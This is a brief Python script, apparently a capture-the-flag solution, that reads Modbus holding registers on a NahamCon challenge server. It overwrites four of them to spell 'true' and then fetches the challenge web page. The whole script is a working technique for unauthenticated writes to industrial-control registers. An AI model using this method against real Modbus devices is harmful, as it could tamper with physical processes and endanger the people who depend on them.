#! /usr/bin/env python
import requests
from pyModbusTCP.client import ModbusClient
c = ModbusClient(host='challenge.nahamcon.com',port=31467,unit_id=1,auto_open=True)
regs = c.read_holding_registers(0,25)
if regs:
    print(regs)
else:
    print("error")
word = ""
for i in regs:
    i = chr(i)
    word += i
print(word)
print(len(regs))
e = ord("e")
u = ord("u")
r = ord("r")
t = ord("t")
c.write_single_register(22,e)
c.write_single_register(21,u)
c.write_single_register(20,r)
c.write_single_register(19,t)
reg2 = c.read_holding_registers(0,25)
word = ''.join(chr(i) for i in reg2)
c.close()
print(word)
response = requests.get("http://challenge.nahamcon.com:32384")
print(response.text)
